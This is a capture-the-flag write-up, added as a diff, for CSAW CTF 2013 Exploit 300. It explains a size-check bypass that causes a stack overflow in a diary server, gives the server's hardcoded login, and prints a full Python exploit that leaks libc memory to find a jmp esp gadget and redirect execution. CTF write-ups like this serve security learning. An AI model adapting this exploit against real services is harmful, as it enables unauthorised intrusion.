@@ -1,0 +1,107 @@
+CSAW CTF 2013 - Exploit 300
+================================
+
+This challenge is a diary server listening on port 34266. When we first connect it prompt us to enter a password and an username. Both value are hardcoded in the application and can be retrieved through reverse engineering. Username is `csaw2013` and password is `S1mplePWD`.
+
+Once we are logged we are prompt to enter a new entry into the diary. We first enter the size of the entry text message and then we enter the entry content.
+
+The exploit is that the size we send first is then used by `recv` to read our entry into a fixed sized buffer of `0x400` bytes. Note that there is a check to see if the size we provided is below `0x400`, but giving a 2 bytes negative number such a `0xFFFF` would pass the test, but still read `0xFFFF` bytes of data, allowing us to smash the stack and overwrite the return adresse.
+
+Since there were no `jmp esp` instruction in the program, I scanned the libc to find an adresse we could return to that would then jump on the shellcode in the buffer. The exploit script used is:
+```
+#!/usr/bin/env python
+
+import socket
+import sys
+import struct
+from struct import pack
+
+host = '128.238.66.217'
+port = 34266
+
+shellcode = ''
+
+user = 'csaw2013'
+pwd = 'S1mplePWD'
+
+def read_until(s, a):
+  data = ''
+  while data.find(a) == -1:
+    data = s.recv(4096)
+
+def connect_to_host():
+
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((host, port))
+
+  read_until(s,'UserName')
+  s.send(user)
+  read_until(s,'Password')
+  s.send(pwd)
+  read_until(s,'Entry')
+  s.send(str(0xFFFF))
+
+  return s
+
+ret_off = 0x420
+def exploit(offset):
+
+  s = connect_to_host()
+  print 'connected'
+  payload = ('\x55' * ret_off) + pack("I", offset) + '\x90'*32 + shellcode
+  s.send(payload)
+  print 'payload sent'
+  s.close()
+
+def leak(offset, size):
+
+  s = connect_to_host()
+  off_send = pack("I", 0x080488B0)
+
+  payload = ('\x55' * ret_off) + off_send
+
+  payload += pack('<I', 0x080487a0) # exit
+  payload += pack('<I', 0x4) # fd
+  payload += pack('<I', offset)
+  payload += pack('<I', size) # len
+  payload += pack('<I', 0x40) # flags
+
+  payload += '\x90'*32 + shellcode
+
+  s.send(payload)
+
+  result = ''
+  data = True
+
+  while data:
+    data = s.recv(1024)
+    result += data
+  s.close()
+
+  return result
+
+def find_jmp_esp():
+  gots = leak(0x0804af80, 4)  # The offset of the got entries.
+  print 'gots: %s' % repr(gots)
+
+  libc_guess = struct.unpack('I', gots[:4])[0]
+  print 'libc_guess: %s' % hex(libc_guess)
+
+  buf_base = libc_guess - (libc_guess % 0x1000)
+
+  buf = leak(buf_base, 4096)
+  while buf:
+    print hex(buf_base)
+    jmp_esp = buf.find("\xff\xe4")  # jmp esp
+    if jmp_esp != -1:
+      return buf_base + jmp_esp
+    else:
+      buf_base += len(buf)
+      buf = leak(buf_base, 4096)
+
+  return 0
+
+jmpesp_addr = find_jmp_esp()
+print 'jmpesp_addr: ', hex(jmpesp_addr)
+exploit(jmpesp_addr)
+```
